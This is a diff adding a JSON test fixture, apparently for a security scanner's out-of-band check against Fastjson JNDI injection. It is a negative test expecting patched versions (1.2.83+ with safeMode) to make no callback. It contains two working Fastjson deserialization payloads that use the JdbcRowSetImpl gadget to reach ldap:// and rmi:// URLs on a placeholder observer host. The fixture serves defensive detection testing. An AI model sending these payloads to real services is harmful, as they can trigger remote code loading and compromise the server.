@@ -1,0 +1,18 @@
+{
+  "engine": "framework_zero_day_engines._run_oob_scan",
+  "kwargs": {
+    "engine_name": "Fastjson",
+    "url": "https://target.example/json",
+    "param": "data",
+    "parsed_query": "data=x",
+    "payload_templates": [
+      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{OBS_DNS}/a\",\"autoCommit\":true}",
+      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{OBS_DNS}/a\",\"autoCommit\":true}"
+    ],
+    "type_label": "Fastjson JNDI 注入",
+    "evidence_note": "fastjson fixture negative fix-version: 修复版(safeMode / 1.2.83+ 黑名单)不发起 JNDI 回调，外带零命中",
+    "recommendation": "维持最小可运行 Fastjson 1.2.83+ 且开启 safeMode",
+    "oob_wait": 1
+  },
+  "expected": {"not_none": false}
+}
